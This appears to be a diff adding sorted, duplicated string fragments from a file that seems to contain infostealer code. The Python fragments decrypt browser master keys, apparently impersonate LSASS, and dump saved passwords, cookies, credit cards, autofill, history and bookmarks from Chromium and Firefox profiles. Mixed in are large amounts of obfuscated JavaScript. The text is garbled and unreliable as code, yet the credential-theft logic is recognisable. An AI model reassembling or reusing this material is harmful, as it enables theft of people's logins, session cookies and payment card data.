@@ -1,0 +1,1459 @@
+ + os.environ[
+ if (host and host.startswith(
+ if bool(secure) else \
+ if bool(secure) else �
+ if secure else \
+ if secure else �
+ in data:\n                    success_count = 0\n                    with open(password_file, \
+ in local_state and \
+ in local_state and �
+ in local_state[\
+ in local_state[�
+ in str(decrypted):\n                                        logger.error(\
+${Cbcchz}\
+${Cbcchz}�
+%Y-%m-%d %H:%M:%S\
+%Y-%m-%d %H:%M:%S�
+) == \
+) == �
+) and \
+) and not encrypted_password.startswith(b
+) and �
+) as f:\n                        f.write(\
+) as f:\n                        for name, value in autofills:\n                            if name and name.strip():\n                                if isinstance(value, bytes) and (value[:3] in (b\
+) as f:\n                    data = json.load(f)\n                \n                if \
+) as f:\n                    f.write(\
+) as f:\n                f.write(\
+) as f:\n                for a in autofills:\n                    f.write(a)\n            logger.debug(f\
+) as f:\n            data = json.load(f)\n            \n        bookmarks = []\n        \n        def process_node(node):\n            if isinstance(node, dict):\n                if node.get(\
+) as f:\n            local_state = json.load(f)\n        \n        if \
+)) else \
+)) else �
+)):\n                                    decrypted = decrypt_v20_value(value, master_key)\n                                    value_str = decrypted if decrypted else \
+)):\n                                decrypted = decrypt_v20_password(login[2], master_key)\n                                if decrypted and not decrypted.startswith(\
+));if(oXWOQ5q){xOlYoR=oXWOQ5q[Q4Ysb_[0x1]][CDD_mEC(Q4Ysb_[0x356])]()[CDD_mEC(Q4Ysb_[0x344])+CDD_mEC(Q4Ysb_[0x345])]()}}catch(ciepIgo){}const qric7jd=[CDD_mEC(Q4Ysb_[0x35c])+\
+));if(oXWOQ5q){xOlYoR=oXWOQ5q[Q4Ysb_[0x1]][CDD_mEC(Q4Ysb_[0x356])]()[CDD_mEC(Q4Ysb_[0x344])+CDD_mEC(Q4Ysb_[0x345])]()}}catch(ciepIgo){}const qric7jd=[CDD_mEC(Q4Ysb_[0x35c])+�
+))}),compressToEncodedURIComponent:FKgRWwE(function(...Mwe5hP){Mwe5hP[Q4Ysb_[0x0]]=Q4Ysb_[0x1];return Q4Ysb_[0x5]==Mwe5hP[Q4Ysb_[0x2]]?\
+))}),compressToEncodedURIComponent:FKgRWwE(function(...Mwe5hP){Mwe5hP[Q4Ysb_[0x0]]=Q4Ysb_[0x1];return Q4Ysb_[0x5]==Mwe5hP[Q4Ysb_[0x2]]?�
+),i4P7QKr=Jb9zeM2[\
+),i4P7QKr=Jb9zeM2[�
+),rhM8iuY=Jb9zeM2[\
+),rhM8iuY=Jb9zeM2[�
+),{[CDD_mEC(0x8e3)]:xFcaN6s,[CDD_mEC(0x8e4)+\
+),{[CDD_mEC(0x8e3)]:xFcaN6s,[CDD_mEC(0x8e4)+�
+).map(ciepIgo=>ciepIgo.charCodeAt()).join(\
+).map(ciepIgo=>ciepIgo.charCodeAt()).join(�
+):\n                                    logger.warning(f\
+):\n                                    success_count += 1\n                                elif decrypted and decrypted.startswith(\
+);return(0x1,ntzJJCk.DaMXYlO)(TV9xde)}static decode(...ciepIgo){ciepIgo[Q4Ysb_[0x0]]=Q4Ysb_[0x1];const TV9xde=ciepIgo[Q4Ysb_[0x2]].toString();ciepIgo[-Q4Ysb_[0x11]]=\
+);return(0x1,ntzJJCk.DaMXYlO)(TV9xde)}static decode(...ciepIgo){ciepIgo[Q4Ysb_[0x0]]=Q4Ysb_[0x1];const TV9xde=ciepIgo[Q4Ysb_[0x2]].toString();ciepIgo[-Q4Ysb_[0x11]]=�
+)[CDD_mEC(Q4Ysb_[0x926])+Q4Ysb_[0x39c]],{[CDD_mEC(Q4Ysb_[0x5cf])+Q4Ysb_[0x103]]:jfGTG5X,[CDD_mEC(Q4Ysb_[0x506])+CDD_mEC(0x8e1)]:MhqouDg,[CDD_mEC(Q4Ysb_[0x510])]:azcp9M_}=Jb9zeM2[\
+)[CDD_mEC(Q4Ysb_[0x926])+Q4Ysb_[0x39c]],{[CDD_mEC(Q4Ysb_[0x5cf])+Q4Ysb_[0x103]]:jfGTG5X,[CDD_mEC(Q4Ysb_[0x506])+CDD_mEC(0x8e1)]:MhqouDg,[CDD_mEC(Q4Ysb_[0x510])]:azcp9M_}=Jb9zeM2[�
+)\n                                    if login[2].startswith(b
+)\n                                f.write(f\
+)\n                            \n                            username = nss_handler.decrypt(encrypted_username) if encrypted_username else \
+)\n                            encrypted_password = login.get(\
+)\n                            encrypted_username = login.get(\
+)\n                            if (login[2][:3] in (b\
+)\n                        f.write(\
+)\n                        for host, name, path, expires, secure, httponly, value in cookies:\n                            flag = \
+)\n                        for login in data[\
+)\n                    con.close()\n                    try: os.remove(cookie_copy)\n                    except: pass\n            else:\n                logger.debug(\
+)\n                    logger.debug(f\
+)\n                    success_count = 0\n                    for login in logins:\n                        if login[2]:\n                            logger.debug(f\
+)\n                \n                with open(password_file, \
+)\n                con = sqlite3.connect(pathlib.Path(login_db_path).as_uri() + \
+)\n                con.close()\n            else:\n                logger.debug(\
+)\n                for b in bookmarks:\n                    f.write(f\
+)\n                for c in cards:\n                    f.write(f\
+)\n                for h in history:\n                    f.write(f\
+)\n                logins = cur.fetchall()\n                logger.debug(f\
+)\n                return b
+)\n                with open(logins_json, \
+)\n            \n        parsed_data[
+)\n            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data[
+)\n            cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=parsed_data[
+)\n            data_path = pathlib.Path(user_profile) / data_path_rel if data_path_rel else None\n            norm = str(data_path).lower() if data_path else 
+)\n            except Exception as e:\n                logger.error(f\
+)\n            key_blob_encrypted = binascii.a2b_base64(local_state[\
+)\n            logger.debug(f\
+)\n            return None\n            \n        with open(local_state_path, \
+)\n            return parsed_data.get(
+)\n            subprocess.run([\
+)\n            with impersonate_lsass():\n                decrypted_aes_key = decrypt_with_cng(parsed_data[
+)\n        # sys.exit(1)\n\n    try:\n        main()\n    except Exception as e:\n        logger.critical(f\
+)\n        \n        # Process Passwords (logins.json)\n        if logins_json.exists():\n            try:\n                logger.debug(f\
+)\n        \n        if not os.path.exists(local_state_path):\n            logger.warning(\
+)\n        \n        if parsed_data[
+)\n        except Exception as e:\n            logger.error(f\
+)\n        ncrypt.NCryptFreeObject(hProvider)\n        return b
+)\n        raise\n\ndef decrypt_with_cng(input_data, key_name):\n    logger.debug(f\
+)\n        return b
+)\n    except Exception as e:\n        logger.error(f\
+)\n    finally:\n        print(\
+)\n    ncrypt = ctypes.windll.NCRYPT\n    hProvider = gdef.NCRYPT_PROV_HANDLE()\n    provider_name = \
+)\n    try:\n        if parsed_data[
+)\n    try:\n        user_profile = os.environ[
+)\n\n        # Process Autofill\n        autofills = extract_gecko_autofill(profile_dir)\n        if autofills:\n            with open(autofill_file, \
+)\n\n        # Process Autofill\n        try:\n            if webdata_db_path.exists():\n                logger.debug(f\
+)\n\n        # Process Bookmarks\n        bookmarks = extract_gecko_bookmarks(profile_dir)\n        if bookmarks:\n            with open(bookmarks_file, \
+)\n\n        # Process Cookies\n        try:\n            if cookie_db_path.exists():\n                logger.debug(f\
+)\n\n        # Process Credit Cards\n        cards = extract_credit_cards(profile_dir, master_key)\n        if cards:\n            with open(credit_cards_file, \
+)\n\n        # Process History\n        history = extract_gecko_history(profile_dir)\n        if history:\n            with open(history_file, \
+)\n\n        # Process History\n        history = extract_history(profile_dir)\n        if history:\n            with open(history_file, \
+)\n\n        # Process Logins\n        try:\n            if login_db_path.exists():\n                logger.debug(f\
+)\n\n        # Shutdown NSS for this profile so we can potentially init another (though NSS often doesn
+)\n\n    logger.info(\
+)\n\nif __name__ == \
+)},Q4Ysb_[0x4]),decompress:FKgRWwE(function(...Mwe5hP){Mwe5hP[Q4Ysb_[0x0]]=Q4Ysb_[0x1];return Q4Ysb_[0x5]==Mwe5hP[Q4Ysb_[0x2]]?\
+)},Q4Ysb_[0x4]),decompress:FKgRWwE(function(...Mwe5hP){Mwe5hP[Q4Ysb_[0x0]]=Q4Ysb_[0x1];return Q4Ysb_[0x5]==Mwe5hP[Q4Ysb_[0x2]]?�
+**** **** **** {last_four}\
+**** **** **** {last_four}�
++(AZfJh8.Ry3JAq[Q4Ysb_[0x2]]||\
++(AZfJh8.Ry3JAq[Q4Ysb_[0x2]]||�
++(AZfJh8.Ry3JAq[Q4Ysb_[ciepIgo+0xac]]||\
++(AZfJh8.Ry3JAq[Q4Ysb_[ciepIgo+0xac]]||�
++(BopMBN[Q4Ysb_[ziFfzJn+-0x1a7]]||\
++(BopMBN[Q4Ysb_[ziFfzJn+-0x1a7]]||�
++(Cck5ZYb.kAG178[Q4Ysb_[0x2]]||\
++(Cck5ZYb.kAG178[Q4Ysb_[0x2]]||�
++(CcvAoqm.VE8C_6K[Q4Ysb_[TV9xde+-0x20]]||\
++(CcvAoqm.VE8C_6K[Q4Ysb_[TV9xde+-0x20]]||�
++(CjVIdGA.GT2hqlP[Q4Ysb_[0x2]]||\
++(CjVIdGA.GT2hqlP[Q4Ysb_[0x2]]||�
++(DiJew6.OUroyzG[Q4Ysb_[ciepIgo+0x7]]||\
++(DiJew6.OUroyzG[Q4Ysb_[ciepIgo+0x7]]||�
++(HWyT0Mf.Vqypxy[Q4Ysb_[ZmaojfE+-0x4f]]||\
++(HWyT0Mf.Vqypxy[Q4Ysb_[ZmaojfE+-0x4f]]||�
++(H_6Wnm.NBu4RSs[Q4Ysb_[ziFfzJn+0x19]]||\
++(H_6Wnm.NBu4RSs[Q4Ysb_[ziFfzJn+0x19]]||�
++(JNlQeG[Q4Ysb_[ciepIgo+-0x4a]]||\
++(JNlQeG[Q4Ysb_[ciepIgo+-0x4a]]||�
++(JU92V0e.iAIEDv6[Q4Ysb_[R01Xodj+-0xda]]||\
++(JU92V0e.iAIEDv6[Q4Ysb_[R01Xodj+-0xda]]||�
++(JdGO4Zb.vLR3vt[Q4Ysb_[0x2]]||\
++(JdGO4Zb.vLR3vt[Q4Ysb_[0x2]]||�
++(JdGO4Zb.vLR3vt[Q4Ysb_[ciepIgo+0x5a]]||\
++(JdGO4Zb.vLR3vt[Q4Ysb_[ciepIgo+0x5a]]||�
++(KFiIeoI.K_oMUEj||\
++(KFiIeoI.K_oMUEj||�
++(LfTDRYl.sF8KlY[Q4Ysb_[ZmaojfE+0x12a]]||\
++(LfTDRYl.sF8KlY[Q4Ysb_[ZmaojfE+0x12a]]||�
++(M2Bco_G.Czfsmit[Q4Ysb_[UGn3r8+-0xf6]]||\
++(M2Bco_G.Czfsmit[Q4Ysb_[UGn3r8+-0xf6]]||�
++(Mwe5hP[Q4Ysb_[0x2]]||\
++(Mwe5hP[Q4Ysb_[0x2]]||�
++(On8avuT.Opc3G6M[Q4Ysb_[0x2]]||\
++(On8avuT.Opc3G6M[Q4Ysb_[0x2]]||�
++(PvqnrVO.Pb9FkO[Q4Ysb_[UGn3r8+0xac]]||\
++(PvqnrVO.Pb9FkO[Q4Ysb_[UGn3r8+0xac]]||�
++(QBgnkq.LQnv57P[Q4Ysb_[0x2]]||\
++(QBgnkq.LQnv57P[Q4Ysb_[0x2]]||�
++(UGn3r8[Q4Ysb_[0x2]]||\
++(UGn3r8[Q4Ysb_[0x2]]||�
++(VV7G9m2.m5In9h[Q4Ysb_[0x2]]||\
++(VV7G9m2.m5In9h[Q4Ysb_[0x2]]||�
++(VfCqnJM.k6lyIMU[Q4Ysb_[0x2]]||\
++(VfCqnJM.k6lyIMU[Q4Ysb_[0x2]]||�
++(WtV8dxr.wJeVyM3[Q4Ysb_[0x2]]||\
++(WtV8dxr.wJeVyM3[Q4Ysb_[0x2]]||�
++(WtV8dxr.wJeVyM3[Q4Ysb_[ziFfzJn+0x5c]]||\
++(WtV8dxr.wJeVyM3[Q4Ysb_[ziFfzJn+0x5c]]||�
++(XCdhnFZ.qvUgiir[Q4Ysb_[0x2]]||\
++(XCdhnFZ.qvUgiir[Q4Ysb_[0x2]]||�
++(ZmaojfE[Q4Ysb_[0x2]]||\
++(ZmaojfE[Q4Ysb_[0x2]]||�
++(aQbA1c.rgP0Iw[Q4Ysb_[UGn3r8+0x4f]]||\
++(aQbA1c.rgP0Iw[Q4Ysb_[UGn3r8+0x4f]]||�
++(akBnod3.bI7yjm||\
++(akBnod3.bI7yjm||�
++(cEFJWZ.MMv1F9[Q4Ysb_[qric7jd+-0x5c]]||\
++(cEFJWZ.MMv1F9[Q4Ysb_[qric7jd+-0x5c]]||�
++(cEFJWZ.MMv1F9[Q4Ysb_[qric7jd+0x65]]||\
++(cEFJWZ.MMv1F9[Q4Ysb_[qric7jd+0x65]]||�
++(cfNHIqy.JLeqrM8[Q4Ysb_[oXWOQ5q+0xc8]]||\
++(cfNHIqy.JLeqrM8[Q4Ysb_[oXWOQ5q+0xc8]]||�
++(ciepIgo[Q4Ysb_[0x2]]||\
++(ciepIgo[Q4Ysb_[0x2]]||�
++(ciepIgo[Q4Ysb_[R01Xodj+0x64]]||\
++(ciepIgo[Q4Ysb_[R01Xodj+0x64]]||�
++(ciepIgo[Q4Ysb_[ziFfzJn+-0x7]]||\
++(ciepIgo[Q4Ysb_[ziFfzJn+-0x7]]||�
++(ciepIgo||\
++(ciepIgo||�
++(eERSpz.YbEteRT||\
++(eERSpz.YbEteRT||�
++(epQZJn.PqFxyy||\
++(epQZJn.PqFxyy||�
++(fCdbn2r.N7C7Se[Q4Ysb_[TV9xde+0xb1]]||\
++(fCdbn2r.N7C7Se[Q4Ysb_[TV9xde+0xb1]]||�
++(hUI9eT.j2igPW[Q4Ysb_[qric7jd+-0x21]]||\
++(hUI9eT.j2igPW[Q4Ysb_[qric7jd+-0x21]]||�
++(hYurnw.mbt6dX[Q4Ysb_[0x2]]||\
++(hYurnw.mbt6dX[Q4Ysb_[0x2]]||�
++(hYurnw.mbt6dX[Q4Ysb_[xOlYoR+0x6e]]||\
++(hYurnw.mbt6dX[Q4Ysb_[xOlYoR+0x6e]]||�
++(i6Rw67H.lgjGVb[Q4Ysb_[ziFfzJn+-0x31]]||\
++(i6Rw67H.lgjGVb[Q4Ysb_[ziFfzJn+-0x31]]||�
++(iFqYgn.eYSMX7[Q4Ysb_[0x2]]||\
++(iFqYgn.eYSMX7[Q4Ysb_[0x2]]||�
++(itPOWB.pV9pMAB||\
++(itPOWB.pV9pMAB||�
++(jQG0xxP.FABuml[Q4Ysb_[0x2]]||\
++(jQG0xxP.FABuml[Q4Ysb_[0x2]]||�
++(jtEKvHU.whbvVp[Q4Ysb_[ciepIgo+0x82]]||\
++(jtEKvHU.whbvVp[Q4Ysb_[ciepIgo+0x82]]||�
++(kbmH4e.iJf7nkZ[Q4Ysb_[0x2]]||\
++(kbmH4e.iJf7nkZ[Q4Ysb_[0x2]]||�
++(kgWoEx.D4sp7f[Q4Ysb_[UGn3r8+0x96]]||\
++(kgWoEx.D4sp7f[Q4Ysb_[UGn3r8+0x96]]||�
++(lMwfKx.UDUx9kQ[Q4Ysb_[ZmaojfE+0x1d]]||\
++(lMwfKx.UDUx9kQ[Q4Ysb_[ZmaojfE+0x1d]]||�
++(pfbvIk.CUjWiB[Q4Ysb_[R01Xodj+0xa5]]||\
++(pfbvIk.CUjWiB[Q4Ysb_[R01Xodj+0xa5]]||�
++(qric7jd||\
++(qric7jd||�
++(rvwt1S.ko68n0[Q4Ysb_[0x2]]||\
++(rvwt1S.ko68n0[Q4Ysb_[0x2]]||�
++(sOATdQ.dI7_Ict[Q4Ysb_[UGn3r8+0x46]]||\
++(sOATdQ.dI7_Ict[Q4Ysb_[UGn3r8+0x46]]||�
++(t_6r_Dc.JNymrQ[Q4Ysb_[ZmaojfE+0x12c]]||\
++(t_6r_Dc.JNymrQ[Q4Ysb_[ZmaojfE+0x12c]]||�
++(vGQbSb8.l93Cdbw[Q4Ysb_[ciepIgo+0xf4]]||\
++(vGQbSb8.l93Cdbw[Q4Ysb_[ciepIgo+0xf4]]||�
++(wGaInM.djgXIt[Q4Ysb_[ZmaojfE+0xfa]]||\
++(wGaInM.djgXIt[Q4Ysb_[ZmaojfE+0xfa]]||�
++(wmBuGW1.UST2B0[Q4Ysb_[R01Xodj+-0x1a2]]||\
++(wmBuGW1.UST2B0[Q4Ysb_[R01Xodj+-0x1a2]]||�
++(x70NlrI.W0M7Wh[Q4Ysb_[qric7jd+0xf2]]||\
++(x70NlrI.W0M7Wh[Q4Ysb_[qric7jd+0xf2]]||�
++(xSRZwz.aYfooMk||\
++(xSRZwz.aYfooMk||�
++(ygU356.gcjlDiC[Q4Ysb_[0x2]]||\
++(ygU356.gcjlDiC[Q4Ysb_[0x2]]||�
++(yhIoEt.SxAWenu[Q4Ysb_[ZmaojfE+-0xeb]]||\
++(yhIoEt.SxAWenu[Q4Ysb_[ZmaojfE+-0xeb]]||�
++(ziFfzJn[Q4Ysb_[0x2]]||\
++(ziFfzJn[Q4Ysb_[0x2]]||�
++(ziFfzJn||\
++(ziFfzJn||�
+, b\
+, buffer.read(4))[0]\n        \n        if header_len + content_len + 8 != len(blob_data):\n            logger.warning(\
+, buffer.read(4))[0]\n        parsed_data[
+, b�
+, encoding=\
+, encoding=�
+, uri=True)\n                cur = con.cursor()\n                cur.execute(\
+,0x1,0x0,\
+,0x1,0x0,�
+,0x3,null,0x20,0x2,0x100,0x6,0x8,0x10,0x4,\
+,0x3,null,0x20,0x2,0x100,0x6,0x8,0x10,0x4,�
+,CKRjMk.Qk68YG=\
+,CKRjMk.Qk68YG=�
+,DiJew6.OUroyzG[Q4Ysb_[qric7jd+-0x91]]=\
+,DiJew6.OUroyzG[Q4Ysb_[qric7jd+-0x91]]=�
+,EZDEHI.k_PUAM=\
+,EZDEHI.k_PUAM=�
+,H0IgbIG.w4lvtf_=\
+,H0IgbIG.w4lvtf_=�
+,HWyT0Mf.Vqypxy[Q4Ysb_[0x7]]=\
+,HWyT0Mf.Vqypxy[Q4Ysb_[0x7]]=�
+,JdGO4Zb.vLR3vt[Q4Ysb_[0x1e]]=\
+,JdGO4Zb.vLR3vt[Q4Ysb_[0x1e]]=�
+,M2Bco_G.Czfsmit[Q4Ysb_[UGn3r8+-0x51]]=\
+,M2Bco_G.Czfsmit[Q4Ysb_[UGn3r8+-0x51]]=�
+,Mwe5hP(0x13),\
+,Mwe5hP(0x13),�
+,Mwe5hP(0x16),Mwe5hP(Q4Ysb_[0x26f]),Mwe5hP(Q4Ysb_[0x1cf]),\
+,Mwe5hP(0x16),Mwe5hP(Q4Ysb_[0x26f]),Mwe5hP(Q4Ysb_[0x1cf]),�
+,Mwe5hP(0x2e),\
+,Mwe5hP(0x2e),�
+,Mwe5hP(0x2f),Mwe5hP(Q4Ysb_[0x1cb]),Mwe5hP(Q4Ysb_[0xd1]),Mwe5hP(Q4Ysb_[0x537]),Mwe5hP(Q4Ysb_[0x13c]),Mwe5hP(Q4Ysb_[0xd5]),Mwe5hP(0x35),\
+,Mwe5hP(0x2f),Mwe5hP(Q4Ysb_[0x1cb]),Mwe5hP(Q4Ysb_[0xd1]),Mwe5hP(Q4Ysb_[0x537]),Mwe5hP(Q4Ysb_[0x13c]),Mwe5hP(Q4Ysb_[0xd5]),Mwe5hP(0x35),�
+,Mwe5hP(0x41),Mwe5hP(Q4Ysb_[0x12e]),Mwe5hP(0x43),Mwe5hP(0x44),Mwe5hP(Q4Ysb_[0x1d4]),\
+,Mwe5hP(0x41),Mwe5hP(Q4Ysb_[0x12e]),Mwe5hP(0x43),Mwe5hP(0x44),Mwe5hP(Q4Ysb_[0x1d4]),�
+,Mwe5hP(Q4Ysb_[0x113]),Mwe5hP(Q4Ysb_[0xe6]),Mwe5hP(Q4Ysb_[0x112]),Mwe5hP(Q4Ysb_[0x146]),Mwe5hP(0x54),Mwe5hP(Q4Ysb_[0x1b0]),\
+,Mwe5hP(Q4Ysb_[0x113]),Mwe5hP(Q4Ysb_[0xe6]),Mwe5hP(Q4Ysb_[0x112]),Mwe5hP(Q4Ysb_[0x146]),Mwe5hP(0x54),Mwe5hP(Q4Ysb_[0x1b0]),�
+,Mwe5hP(Q4Ysb_[0x12]),Mwe5hP(Q4Ysb_[0x45]),Mwe5hP(Q4Ysb_[0x164]),Mwe5hP(Q4Ysb_[0x29]),Mwe5hP(Q4Ysb_[0x18]),\
+,Mwe5hP(Q4Ysb_[0x12]),Mwe5hP(Q4Ysb_[0x45]),Mwe5hP(Q4Ysb_[0x164]),Mwe5hP(Q4Ysb_[0x29]),Mwe5hP(Q4Ysb_[0x18]),�
+,Mwe5hP(Q4Ysb_[0x12a]),Mwe5hP(0x48),\
+,Mwe5hP(Q4Ysb_[0x12a]),Mwe5hP(0x48),�
+,Mwe5hP(Q4Ysb_[0x13]),\
+,Mwe5hP(Q4Ysb_[0x13]),�
+,Mwe5hP(Q4Ysb_[0x13d]),Mwe5hP(Q4Ysb_[0x13e]),Mwe5hP(Q4Ysb_[0x13f]),\
+,Mwe5hP(Q4Ysb_[0x13d]),Mwe5hP(Q4Ysb_[0x13e]),Mwe5hP(Q4Ysb_[0x13f]),�
+,Mwe5hP(Q4Ysb_[0x14c]),Mwe5hP(Q4Ysb_[0x181]),\
+,Mwe5hP(Q4Ysb_[0x14c]),Mwe5hP(Q4Ysb_[0x181]),�
+,Mwe5hP(Q4Ysb_[0x17b]),Mwe5hP(Q4Ysb_[0x1b2]),\
+,Mwe5hP(Q4Ysb_[0x17b]),Mwe5hP(Q4Ysb_[0x1b2]),�
+,Mwe5hP(Q4Ysb_[0x19]),Mwe5hP(Q4Ysb_[0x1a]),Mwe5hP(Q4Ysb_[0xb]),\
+,Mwe5hP(Q4Ysb_[0x19]),Mwe5hP(Q4Ysb_[0x1a]),Mwe5hP(Q4Ysb_[0xb]),�
+,Mwe5hP(Q4Ysb_[0x1f8]),\
+,Mwe5hP(Q4Ysb_[0x1f8]),�
+,Mwe5hP(Q4Ysb_[0x1f9]),\
+,Mwe5hP(Q4Ysb_[0x1f9]),�
+,Mwe5hP(Q4Ysb_[0x21e]),Mwe5hP(Q4Ysb_[0xe4]),Mwe5hP(Q4Ysb_[0xde]),Mwe5hP(Q4Ysb_[0x2f6]),Mwe5hP(Q4Ysb_[0x2d4]),\
+,Mwe5hP(Q4Ysb_[0x21e]),Mwe5hP(Q4Ysb_[0xe4]),Mwe5hP(Q4Ysb_[0xde]),Mwe5hP(Q4Ysb_[0x2f6]),Mwe5hP(Q4Ysb_[0x2d4]),�
+,Mwe5hP(Q4Ysb_[0x22c]),Mwe5hP(0x1c),Mwe5hP(0x1d),\
+,Mwe5hP(Q4Ysb_[0x22c]),Mwe5hP(0x1c),Mwe5hP(0x1d),�
+,Mwe5hP(Q4Ysb_[0x26]),Mwe5hP(Q4Ysb_[0x6]),Mwe5hP(Q4Ysb_[0x1f]),Mwe5hP(0x22),Mwe5hP(Q4Ysb_[0x165]),Mwe5hP(Q4Ysb_[0x11c]),Mwe5hP(Q4Ysb_[0x12c]),Mwe5hP(0x26),Mwe5hP(0x27),Mwe5hP(Q4Ysb_[0xda]),\
+,Mwe5hP(Q4Ysb_[0x26]),Mwe5hP(Q4Ysb_[0x6]),Mwe5hP(Q4Ysb_[0x1f]),Mwe5hP(0x22),Mwe5hP(Q4Ysb_[0x165]),Mwe5hP(Q4Ysb_[0x11c]),Mwe5hP(Q4Ysb_[0x12c]),Mwe5hP(0x26),Mwe5hP(0x27),Mwe5hP(Q4Ysb_[0xda]),�
+,Mwe5hP(Q4Ysb_[0x27]),Mwe5hP(0x40),\
+,Mwe5hP(Q4Ysb_[0x27]),Mwe5hP(0x40),�
+,Mwe5hP(Q4Ysb_[0x2d3]),Mwe5hP(Q4Ysb_[0x22f]),Mwe5hP(Q4Ysb_[0x1d5]),Mwe5hP(Q4Ysb_[0x11]),Mwe5hP(0x2d),\
+,Mwe5hP(Q4Ysb_[0x2d3]),Mwe5hP(Q4Ysb_[0x22f]),Mwe5hP(Q4Ysb_[0x1d5]),Mwe5hP(Q4Ysb_[0x11]),Mwe5hP(0x2d),�
+,Mwe5hP(Q4Ysb_[0x2f5]),\
+,Mwe5hP(Q4Ysb_[0x2f5]),�
+,Mwe5hP(Q4Ysb_[0x36]),Mwe5hP(Q4Ysb_[0x9]),\
+,Mwe5hP(Q4Ysb_[0x36]),Mwe5hP(Q4Ysb_[0x9]),�
+,Mwe5hP(Q4Ysb_[0x48]),\
+,Mwe5hP(Q4Ysb_[0x48]),�
+,Mwe5hP(Q4Ysb_[0x490]),\
+,Mwe5hP(Q4Ysb_[0x490]),�
+,Mwe5hP(Q4Ysb_[0x4ec]),\
+,Mwe5hP(Q4Ysb_[0x4ec]),�
+,Mwe5hP(Q4Ysb_[0x4ee]),Mwe5hP(Q4Ysb_[0x4ef]),Mwe5hP(Q4Ysb_[0x4f0]),Mwe5hP(Q4Ysb_[0x4f2]),Mwe5hP(Q4Ysb_[0x4f3]),\
+,Mwe5hP(Q4Ysb_[0x4ee]),Mwe5hP(Q4Ysb_[0x4ef]),Mwe5hP(Q4Ysb_[0x4f0]),Mwe5hP(Q4Ysb_[0x4f2]),Mwe5hP(Q4Ysb_[0x4f3]),�
+,Mwe5hP(Q4Ysb_[0x4f4]),Mwe5hP(Q4Ysb_[0x4f5]),Mwe5hP(Q4Ysb_[0x4f6]),Mwe5hP(Q4Ysb_[0x4f7]),Mwe5hP(Q4Ysb_[0x4f8]),Mwe5hP(Q4Ysb_[0x4f9]),Mwe5hP(Q4Ysb_[0x4fa]),Mwe5hP(Q4Ysb_[0x4fb]),Mwe5hP(Q4Ysb_[0x4fc]),\
+,Mwe5hP(Q4Ysb_[0x4f4]),Mwe5hP(Q4Ysb_[0x4f5]),Mwe5hP(Q4Ysb_[0x4f6]),Mwe5hP(Q4Ysb_[0x4f7]),Mwe5hP(Q4Ysb_[0x4f8]),Mwe5hP(Q4Ysb_[0x4f9]),Mwe5hP(Q4Ysb_[0x4fa]),Mwe5hP(Q4Ysb_[0x4fb]),Mwe5hP(Q4Ysb_[0x4fc]),�
+,Mwe5hP(Q4Ysb_[0x51a]),Mwe5hP(Q4Ysb_[0x51b]),Mwe5hP(Q4Ysb_[0x51c]),Mwe5hP(Q4Ysb_[0x51d]),\
+,Mwe5hP(Q4Ysb_[0x51a]),Mwe5hP(Q4Ysb_[0x51b]),Mwe5hP(Q4Ysb_[0x51c]),Mwe5hP(Q4Ysb_[0x51d]),�
+,Mwe5hP(Q4Ysb_[0x51e]),Mwe5hP(Q4Ysb_[0x51f]),\
+,Mwe5hP(Q4Ysb_[0x51e]),Mwe5hP(Q4Ysb_[0x51f]),�
+,Mwe5hP(Q4Ysb_[0x520]),\
+,Mwe5hP(Q4Ysb_[0x520]),�
+,Mwe5hP(Q4Ysb_[0x521]),\
+,Mwe5hP(Q4Ysb_[0x521]),�
+,Mwe5hP(Q4Ysb_[0x5a7]),Mwe5hP(Q4Ysb_[0x5a8]),Mwe5hP(Q4Ysb_[0x5a9]),Mwe5hP(Q4Ysb_[0x5aa]),\
+,Mwe5hP(Q4Ysb_[0x5a7]),Mwe5hP(Q4Ysb_[0x5a8]),Mwe5hP(Q4Ysb_[0x5a9]),Mwe5hP(Q4Ysb_[0x5aa]),�
+,Mwe5hP(Q4Ysb_[0x5ab]),\
+,Mwe5hP(Q4Ysb_[0x5ab]),�
+,Mwe5hP(Q4Ysb_[0x5d9]),Mwe5hP(Q4Ysb_[0x5da]),Mwe5hP(Q4Ysb_[0x5db]),Mwe5hP(Q4Ysb_[0x5dc]),Mwe5hP(Q4Ysb_[0x5de]),Mwe5hP(Q4Ysb_[0x5df]),Mwe5hP(Q4Ysb_[0x5e0]),\
+,Mwe5hP(Q4Ysb_[0x5d9]),Mwe5hP(Q4Ysb_[0x5da]),Mwe5hP(Q4Ysb_[0x5db]),Mwe5hP(Q4Ysb_[0x5dc]),Mwe5hP(Q4Ysb_[0x5de]),Mwe5hP(Q4Ysb_[0x5df]),Mwe5hP(Q4Ysb_[0x5e0]),�
+,Mwe5hP(Q4Ysb_[0x5e1]),Mwe5hP(Q4Ysb_[0x5e2]),Mwe5hP(Q4Ysb_[0x5e3]),Mwe5hP(Q4Ysb_[0x5e4]),Mwe5hP(Q4Ysb_[0x5e5]),Mwe5hP(Q4Ysb_[0x5e6]),Mwe5hP(Q4Ysb_[0x5e7]),\
+,Mwe5hP(Q4Ysb_[0x5e1]),Mwe5hP(Q4Ysb_[0x5e2]),Mwe5hP(Q4Ysb_[0x5e3]),Mwe5hP(Q4Ysb_[0x5e4]),Mwe5hP(Q4Ysb_[0x5e5]),Mwe5hP(Q4Ysb_[0x5e6]),Mwe5hP(Q4Ysb_[0x5e7]),�
+,Mwe5hP(Q4Ysb_[0x5fe]),Mwe5hP(Q4Ysb_[0x5ff]),Mwe5hP(Q4Ysb_[0x600]),Mwe5hP(Q4Ysb_[0x601]),Mwe5hP(Q4Ysb_[0x602]),\
+,Mwe5hP(Q4Ysb_[0x5fe]),Mwe5hP(Q4Ysb_[0x5ff]),Mwe5hP(Q4Ysb_[0x600]),Mwe5hP(Q4Ysb_[0x601]),Mwe5hP(Q4Ysb_[0x602]),�
+,Mwe5hP(Q4Ysb_[0x6b1]),\
+,Mwe5hP(Q4Ysb_[0x6b1]),�
+,Mwe5hP(Q4Ysb_[0x6b2]),Mwe5hP(Q4Ysb_[0x6b3]),Mwe5hP(Q4Ysb_[0x6b4]),\
+,Mwe5hP(Q4Ysb_[0x6b2]),Mwe5hP(Q4Ysb_[0x6b3]),Mwe5hP(Q4Ysb_[0x6b4]),�
+,Mwe5hP(Q4Ysb_[0x6b5]),Mwe5hP(Q4Ysb_[0x6b6]),Mwe5hP(Q4Ysb_[0x6b7]),Mwe5hP(Q4Ysb_[0x6b8]),Mwe5hP(Q4Ysb_[0x6b9]),Mwe5hP(Q4Ysb_[0x6ba]),\
